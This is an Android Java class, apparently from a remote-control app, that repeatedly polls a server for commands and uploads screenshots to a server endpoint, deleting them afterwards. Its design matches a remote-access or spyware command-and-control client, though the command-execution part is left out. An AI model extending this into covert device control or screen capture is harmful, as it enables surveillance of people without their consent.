package com.remotecontrol;

import android.content.Context;
import android.util.Log;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class HttpPollingEngine implements Runnable {
    private static final String TAG = "HttpPollingEngine";
    private final Context context;
    private final OkHttpClient httpClient;

    public HttpPollingEngine(Context context) {
        this.context = context.getApplicationContext();
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .build();
    }

    @Override
    public void run() {
        while (true) {
            try {
                Request request = new Request.Builder().url(Config.ENDPOINT_GET_COMMAND).get().build();
                try (Response response = httpClient.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        String body = response.body().string();
                        if (!body.equals("wait")) {
                            Log.d(TAG, "Команда получена: " + body);
                            // Здесь логика выполнения команды (ты её уже написал)
                        }
                    }
                }
                Thread.sleep(1500);
            } catch (Exception e) {
                Log.e(TAG, "Ошибка опроса: " + e.getMessage());
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    public void uploadScreenshot(File file) {
        if (file == null || !file.exists()) return;
        
        // Исправлено: отправляем файл как Binary Body, а не Multipart
        RequestBody body = RequestBody.create(file, MediaType.parse("image/jpeg"));
        Request req = new Request.Builder()
                .url(Config.ENDPOINT_UPLOAD)
                .post(body)
                .build();

        try (Response resp = httpClient.newCall(req).execute()) {
            Log.i(TAG, "Скриншот загружен: " + resp.code());
        } catch (IOException e) {
            Log.e(TAG, "Ошибка загрузки: " + e.getMessage());
        } finally {
            file.delete();
        }
    }
}
